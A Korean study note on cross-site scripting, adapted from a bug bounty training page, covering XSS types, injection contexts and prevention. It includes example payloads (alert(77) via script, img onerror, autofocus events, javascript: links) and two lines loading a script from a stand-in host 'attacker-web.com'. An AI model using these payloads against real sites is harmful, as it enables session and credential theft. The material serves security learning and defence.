# XSS 기초

개인 공부용으로 참고하기 위해서 버그바운티 클럽의 Pentest Gym에서 퍼온 사진과 글을 참고하여 정리한 문서입니다. 

| 출처 : https://www.bugbountyclub.com/pentestgym/view/43

# XSS란?
웹 애플리케이션으로 전달되는 사용자의 입력이 유효성 검증이나 위생처리(인코딩) 없이 서버의 응답에 삽입 될 때 사용자의 웹 브라우저에서 악성 스크립트를 실행할 수 있는 취약점이다. GET 매개변수나 POST 데이터, 숨겨진 폼 필드, HTTP 요청 헤더 등을 통해 전달되게 된다. 즉, 사용자는 이러한 매개체를 통해 웹 애플리케이션이 기대하는 정상적인 입력값이 아닌 HTML 코드나 JS 코드를 서버로 전달할 수 있고, 서버가 이에 대해 안전하지 않은 방식으로 서버의 응답 페이지에 코드를 삽입, 표시한다면 이 코드는 사용자의 웹 브라우저에서 실행되게 된다.

# XSS의 영향
HTML 코드나 JS 코드가 사용자의 웹 브라우저에서 실행되면 어떤 문제가 있을까? XSS의 영향은 웹 애플리케이션마다 다를 수 있지만, 일반적으로 봤을때는 HTML 코드가 삽입 된다면 공격자가 임의로 만든 아이디와 패스워드를 요구하는 웹 페이지를 웹 애플리케이션에 삽입해 아이디와 패스워드를 탈취하거나 JS를 통해 사용자의 쿠키나 세션을 탈취하여 해당 사용자 행세를 할 수 있다. 특히 피해자에게 관리자 권한이 있는 경우에는 웹 애플리케이션을 장악하여 데이터베이스를 수정 및 삭제하는 등 웹 애플리케이션 전반에 걸쳐 치명적 손상을 가할 수 있다. 
- 세션 쿠키 탈취를 통한 계정 도용
- 가짜 로그인 페이지를 통한 자격증명 탈취 및 도용
- 민감한 데이터 유출
- 키 로깅 (Key Logging)

# XSS의 유형
- Reflected XSS(반사된 XSS)
- Stored XSS or Persistent XSS or Type 1 XSS (저장된 XSS)
- DOM XSS (Type 0 XSS)
- Self XSS : 공식적인 유형은 아님

## Reflected XSS(반사된 XSS)
사용자의 입력값이 응답 소스코드에 즉각적으로 포함되어 사용자의 웹 브라우저에 표시될때 발생하는 취약점으로 사용자의 입력값이 악성 스크립트인 경우 웹 브라우저가 이 악성 스크립트를 실행하게 되는 취약점이다. 서버는 요청에 포함된 입력값을 받아 1회성으로 응답에 포함시키므로 비영구 XSS(Non-Persistent XSS)라고도하며, Type 2 XSS라고도 한다

공격자는 입력값으로 악성 자바스크립트 파일의 URL을 다른 웹 사이트의 게시판 링크로 등록하거나 SNS, 이메일 등을 통해 URL을 유포하고 누군가 해당 링크를 클릭하기를 기다린다
만약 어떤 웹 애플리케이션에서 검색 기능이 사용자가 검색한 문자열을 응답에 표시하는 경우 아래와 같은 URL을 사용하여 반사된 XSS 취약점을 악용할 수 있다.
```
https://vulnerable-web.com/search?query=<script%20src=http://attacker-web.com/malicious-script.js>
```
이 URL을 방문한 사용자의 웹 브라우저는 attacker-web.com에 존재하는 malicious-script.js 파일을 실행하게 된다
![](https://www.bugbountyclub.com/uploads/images/training/1618805773.png)

## Stored XSS(저장된 XSS)
사용자 입력값이 서버에 저장되어 있다가 다른 요청에 의해 저장되었던 값을 가져와 응답 소스코드에 안전하지 않은 방식으로 표시하는 경우 발생한다. 인증된 사용자가 사용하는 기능에서 흔히 발생하는 취약점으로 반사된 XSS보다 위험한 취약점으로 평가된다. 일반적으로 취약한 POST 요청을 통해 악성 스크립트를 웹 애플리케이션에 저장하게 된다. 반사된 XSS는 악성 링크에 스크립트가 포함되어 해당 링크를 클릭했을 경우에 한해 공격이 유효했던 것과 달리 악성 스크립트가 웹서버에 지속적으로 저장되어 있다가 이 저장된 입력값을 사용하는 다른 요청에 의해 언제든지 실행될 수 있으므로 영구 XSS(Persistent XSS) 라고도 한다.

저장된 XSS가 흔히 나타나는 기능은 글을 작성하여 등록할 수 있는 게시판이나 블로그 또는 회원 프로필 조회등이 있으며 사용자가 악성 스크립트가 저장된 웹 페이지를 열람할때마다 스크립트를 실행한다
저장된 XSS에 취약한 회원 프로필 수정 기능을 생각한다. 공격자는 자신의 프로필의 소개 섹션에 다음과 같은 악성 스크립트가 포함된 스크립트를 저장해둔다
```
<script%20src=http://attacker-web.com/malicious-script.js>
```
피해자가 공격자의 프로필을 조회할 때마다 스크립트는 피해자의 웹 브라우저에서 실행되고 공격자의 웹 서버에 있는 malicious-script.js를 실행하게 된다
![](https://www.bugbountyclub.com/uploads/images/training/1618805791.png)

## DOM XSS
DOM XSS는 Document Object Model XSS로 웹 애플리케이션이 사용자 입력값을 안전하지 않은 방식으로 문서 객체 모델(DOM)에 쓸 경우 발생하는 취약점이다. DOM에 데이터를 쓰는 작업은 응답 페이지에 구현되어 있는 자바스크립트에 의해 수행되며, 사용자 입력값이 웹 서버로 전송되지 않아도 웹 브라우저에 응답으로 표시될 수 있다. 즉, 웹 서버에 구현된 입력값 검증 등의 방어 기능에서 자유로워 질 수 있다.
![](https://www.bugbountyclub.com/uploads/images/training/1618805810.png) 

## Self XSS
조금 다른 관점에서의 XSS이다. Self XSS는 자바스크립트 코드가 실행되지만 다른 사용자의 웹 브라우저에서는 실행되지 않고 공격자의 웹 브라우저 환경에서만 유효한 경우이다. 이 유형의 XSS는 일반적으로 웹 애플리케이션에 무해한 것으로 평가되어 버그 헌팅시에도 유효버그로 인정 받을 수 없다. 유효 버그로 인정받기 위해선 CSRF와 같은 취약점과 연계하는 방법이 있다.

# XSS는 응답의 어떤 위치에서 나타날까?
위에서 살펴본 XSS 유형들의 공통점은 사용자의 입력값이 응답 소스코드에 표시된다는 점이다.

## HTML 태그와 태그 사이(원시(Raw) HTML 영역)
HTML 태그와 태그의 사이에 사용자의 입력이 삽입되는 경우이다. 다음과 같이 어떤 웹 애플리케이션의 검색 기능에서 사용자가 입력한 검색어가 서버의 응답페이지에 삽입된다고 가정했을때, 사용자가 검색어로 "버그바운티클럽"을 입력한 후 검색 기능을 수행했을때에는 응답이 다음과 같이 나타난다.
```
<p>버그바운티클럽에 대한 4건의 검색 결과를 찾았습니다.</p>
```
`<p>` 태그에서 사용자 입력값이 나타나며, 이런 경우 공격자는 아래와 같은 다양한 HTML 태그를 이용할 수 있다
- `<script>`
- `<img>`
- `<svg>`
- `<iframe>`

아래와 같이 `<script>` 태그를 사용한 페이로드를 구성하여 웹 브라우저에 77이라는 경고를 띄우는 스크립트 실행가능하다
```
<p><script>alert(77)</script>에 대한 0건의 검색 결과를 찾았습니다.</p>
```
아래와 같이 `<img>` 태그와 onerror 이벤트를 이용한 페이로드도 동일한 동작을 수행한다
```
<p><img src=x onerror=alert(77)>에 대한 0건의 검색 결과를 찾았습니다.</p>
```

## HTML 태그 내부의 속성값
다음과 같이 HTML 태그 내부의 속성값에 입력이 삽입되는 경우
```
<input type="text" name="myInput" value="사용자 입력값">
```
위 코드 같은 경우 `<input>` 태그의 value 속성의 값으로 사용자 입력이 삽입된다. 이 경우 태그를 탈출할 수 있는지 여부에 따라 적절한 페이로드를 사용하면 XSS 공격이 가능하다

1. 속성과 태그 모두 탈출이 가능할 때
`"><script>alert(77)</script>`를 이용하여 기존 `<input>` 태그를 정상적으로 종료시키고 원시 HTML 영역에 스크립트를 주입할 수 있다
```
<input type="text" name="myInput" value=""><script>alert(77)</script>">
```

2. 속성은 탈출할 수 있으나 태그를 탈출할 수 없을 때
이벤트를 사용해 `<input>` 태그를 탈출하지 않고도 XSS 공격이 가능하다 다음 예시에서는 onfocus 이벤트를 사용하여 해당 input 필드에 포커싱이 발생하면 팝업을 띄우는 경우이다. onfocus 같은 경우 사용자과 상호작용없이 XSS가 트리거 되도록 자동 포커싱되게 하는 autofocus와 함께 사용된다.
```
<input type="text" name="myInput" value="foobar" onfocus=alert(77) autofocus "">
```

3. hidden 타입으로 된 input 태그의 속성값이 표시될 때
종종 hidden 속성이 지정된 input 태그를 통해 처리에 필요한 파라미터를 전달하곤 하는데 아래와 같이 hidden으로 지정된 input 태그의 value 속성에 사용자 입력이 표시된다고 생각
```
<input type="hidden" id="myInput" value="사용자 입력값">
```
이 경우 사용자 입력으로 꺽쇠괄호(<,>)를 사용할 수 있다면 1. 처럼 태그를 탈출하고 스크립트를 실행할 수 있는 다른 태그를 주입하면 간단히 XSS 실행이 가능하다
하지만 꺽쇠괄호를 무해한 문제로 인코딩하거나 제거하는 필터링이 있다면 2. 대로 속성을 탈출하고 onfocus나 onclick과 같은 이벤트를 통해 XSS를 동작시킨다.

그러나 hidden으로 지정된 태그는 onfocus, onclick과 같은 이벤트가 동작하지 않는다.

4. href 또는 src 속성에 표시될 때
URL 파일 경로를 속성값으로 갖는 href 또는 src 속성에 사용자 입력값이 표시되고 별다른 필터링이 없을 경우이다. (ex. `<a href=....`, `<img src...`, `<iframe src...`)
아래와 같은 javascript 프로토콜을 이용하여 임의의 스크립트를 실행 시킬수도 있다
```
<a href=javascript:alert(77);>임의의 텍스트</a>
```

# XSS 예방
- 사용자 입력값 검증 - HTML 태그나 자바스크립트 등에서 사용될 수 있는 특수문자를 안전한 문자로 치환하거나 차단
- 올바른 데이터 출력값 처리 - 이스케이프 또는 인코딩 사용
- 쿠키에 HttpOnly 플래그 설정
- CSP(Content Security Policy) 적용
- 응답페이지에 올바른 MIME TYPE 설정
- 웹 방화벽 구축
